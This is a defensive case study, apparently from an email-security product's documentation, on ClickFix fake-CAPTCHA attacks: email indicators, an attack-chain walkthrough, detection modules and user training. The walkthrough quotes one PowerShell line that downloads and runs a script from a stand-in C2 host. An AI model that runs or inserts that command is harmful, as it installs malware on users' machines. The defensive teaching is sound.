---
title: ClickFix / Fake CAPTCHA Payload Delivery
description: ClickFix tricks victims into pasting attacker-supplied PowerShell into Win+R from a fake human-verification page. Vigilyx blocks it via landing-page fingerprinting and multi-module convergence.
---

# Case 01 — ClickFix / Fake CAPTCHA Payload Delivery

Sources: Proofpoint, CISA AA24-241A, Microsoft Threat Intelligence, Sophos X-Ops (2024 to 2025).

## Background

ClickFix is one of the most active initial-access techniques from late 2024 through 2026. Attackers host malicious PowerShell or mshta commands on impersonation pages (fake Cloudflare verification, fake Google reCAPTCHA, fake Microsoft Word errors) and trick the victim into pressing Win+R, pasting the command, and pressing Enter themselves. Because the user typed the command, browser SmartScreen and most EDR initial-execution checks are bypassed.

Common email vectors:

- Fake DocuSign / Adobe / Microsoft document-share notifications
- "GitHub security alert" subjects (targeting developers)
- "Meeting recording is ready" subjects (corporate users)
- Plausible PDF / Word attachments containing redirect links

## Email indicators

- Sender domains: lookalikes (`docusing-secure.com`, `docus1gn.com`, `microsoft-365-help.com`)
- SPF/DKIM: typically passes (attacker uses real registered domain via SES/SendGrid/Mailgun)
- Links: heavy use of `*.workers.dev`, `*.pages.dev`, `*.r2.dev`, `*.web.app`
- HTML: notification-style with one big CTA button and minimal body text
- Attachments: occasionally HTML attachments containing the fake reCAPTCHA UI directly

## Animated walkthrough

<AttackSimulation
  title="ClickFix end-to-end"
  :interval="2400"
  :steps='[
    {
      actor: "attacker",
      title: { zh: "伪造 DocuSign 通知邮件", en: "Forge DocuSign-style notification email" },
      detail: { zh: "注册同形域名，通过合规邮件服务批量投递", en: "Register lookalike domain, send via reputable ESP" }
    },
    {
      actor: "victim",
      title: { zh: "受害者点击 REVIEW DOCUMENT", en: "Victim clicks the REVIEW DOCUMENT button" },
      payload: "https://verify-cf.workers.dev/?id=ABC123"
    },
    {
      actor: "attacker",
      title: { zh: "落地页伪装人机验证", en: "Landing page mimics human verification" },
      detail: { zh: "页面提示按 Win+R, Ctrl+V, Enter", en: "Page prompts user to press Win+R, paste, Enter" }
    },
    {
      actor: "system",
      title: { zh: "JavaScript 已悄悄写入剪贴板", en: "JavaScript silently wrote command to clipboard" },
      payload: "powershell -w h -c iwr https://c2.bad/x.ps1 | iex"
    },
    {
      actor: "victim",
      title: { zh: "受害者亲手执行命令", en: "Victim executes the command themselves" }
    },
    {
      actor: "attacker",
      title: { zh: "C2 下发 Lumma / DarkGate 载荷", en: "C2 delivers Lumma / DarkGate payload" }
    },
    {
      actor: "vigilyx",
      title: { zh: "Vigilyx 链路全程拦截", en: "Vigilyx blocks the chain end-to-end" },
      detection: { zh: "header_scan 命中同形域名 + link_content 抓取落地页发现 clipboard.writeText 与 Win+R 指纹 + content_scan 命中钓鱼词，融合后判 High", en: "header_scan flags the lookalike, link_content fetches the landing page and detects clipboard.writeText plus Win+R fingerprints, content_scan matches phishing terms; DS-Murphy fusion escalates to High" }
    }
  ]'
/>

## Vigilyx detection coverage

Vigilyx blocks ClickFix without relying on external threat intelligence:

- **Lookalike domain detection** — `header_scan` checks IDN homoglyphs and substitution characters (`crates/vigilyx-engine/src/modules/header_scan.rs`)
- **Dynamic-hosting downgrade** — `link_scan` flags `*.workers.dev`, `*.pages.dev`, `*.r2.dev` (`crates/vigilyx-engine/src/modules/link_scan.rs`)
- **Landing-page fingerprinting** — `link_content` and `landing_page_scan` fetch the destination and match Win+R / `clipboard.writeText` fingerprints (`crates/vigilyx-engine/src/modules/link_content.rs`, `landing_page_scan.rs`)
- **Phishing-keyword normalization** — `content_scan` normalizes traditional/simplified Chinese and fullwidth characters before matching (`crates/vigilyx-engine/src/modules/content_scan/mod.rs`)
- **Multi-module convergence** — DS-Murphy fusion plus the convergence circuit breaker escalate to High when 3 or more modules fire (`crates/vigilyx-engine/src/pipeline/verdict.rs`, steps 6.5 / 6.6)
- **Auto IOC retention** — once a verdict reaches High, the C2 domain is added to the local IOC store so subsequent emails hit immediately (`crates/vigilyx-engine/src/ioc.rs`)

In real-world replay against production traffic, Vigilyx reaches High on Cloudflare-Workers-hosted ClickFix landing pages without any external IOC feed, purely by combining `link_content` fingerprints with `content_scan` generic phishing terms.

## Defense

- Add `*.workers.dev`, `*.pages.dev`, `*.r2.dev`, `*.web.app`, `*.netlify.app` newly-registered subdomains to a risk list (do not blanket-block — these platforms host plenty of legitimate traffic)
- Enforce landing-page fetching where compliance allows; reject any page containing `clipboard.writeText` plus Win+R fingerprints
- Disable common PowerShell parameters (`-EncodedCommand`, `-w hidden`) at the endpoint via GPO

## End-user training

- Any "human verification" that asks for a keyboard shortcut is an attack — Microsoft, Cloudflare, and Google never require manual command execution
- DocuSign and Adobe notifications come only from `docusign.net` and `adobesign.com`; everything else is a lookalike
